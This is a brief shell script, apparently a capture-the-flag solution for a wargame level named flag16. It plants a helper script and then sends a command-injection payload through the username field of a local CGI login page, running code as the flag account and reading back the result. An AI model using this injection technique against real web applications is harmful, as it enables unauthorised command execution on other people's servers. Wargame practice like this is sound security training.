# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

echo -e "#\!/bin/bash\ngetflag;id" > ~/D
wget 'http://localhost:1616/index.cgi?username=blah%22%26../*/D%3EA%3B%22&password=' -O - -o /dev/null
cat /home/flag16/A